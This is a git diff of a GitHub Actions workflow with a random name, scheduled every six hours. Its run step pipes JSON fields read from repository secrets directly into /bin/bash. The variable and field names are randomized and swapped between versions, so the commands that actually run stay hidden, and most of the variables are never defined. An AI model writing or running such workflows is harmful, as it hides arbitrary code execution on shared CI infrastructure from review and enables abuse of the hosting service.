@@ -1,10 +1,10 @@
 name: guozhongren1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
-
-jobs:  # 26443
+    - cron: '42 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,24 +12,13 @@ jobs:  # 26443
       - uses: actions/checkout@v4
       - name: guozhongren1234
         env:
-          xpk2: ${{ secrets.xpk2 }}
+          wxds8923: ${{ secrets.wxds8923 }}
         run: |
-          echo $xpk2 | jq -r .aao27 | /bin/bash
-          echo $ky6276 | jq -r .z22 | /bin/bash
-          echo $s1 | jq -r .zics925 | /bin/bash
-          echo $vvp418 | jq -r .go831 | /bin/bash
-          echo $q591 | jq -r .x1 | /bin/bash
-          echo $zhp70 | jq -r .lohsp736 | /bin/bash
-          echo $qf4478 | jq -r .sl6116 | /bin/bash
-          echo $en19 | jq -r .zlm14 | /bin/bash
-          echo $nspdl48 | jq -r .s71 | /bin/bash
-          echo $fm88 | jq -r .qejk12694 | /bin/bash
-          echo $jayxt88 | jq -r .wemif9260 | /bin/bash
-          echo $vku119 | jq -r .c539 | /bin/bash
-          echo $nvvwo631 | jq -r .qctsy10 | /bin/bash
-          echo $juod4820 | jq -r .ikz8 | /bin/bash
-          echo $ira78 | jq -r .p9 | /bin/bash
-          echo $tqd641 | jq -r .efll2 | /bin/bash
-          echo $xxf11162 | jq -r .j8 | /bin/bash
-          echo $e24 | jq -r .cntbb5 | /bin/bash
+          echo $wxds8923 | jq -r .fcbpo07969 | /bin/bash
+          echo $wrqim8 | jq -r .nqj70933 | /bin/bash
+          echo $oid5 | jq -r .pacw7 | /bin/bash
+          echo $uscic07 | jq -r .opv3 | /bin/bash
+          echo $ryvj78 | jq -r .z28025 | /bin/bash
+          echo $lthl6819 | jq -r .lgnp1 | /bin/bash
+          echo $othbv449 | jq -r .pystj39185 | /bin/bash
 
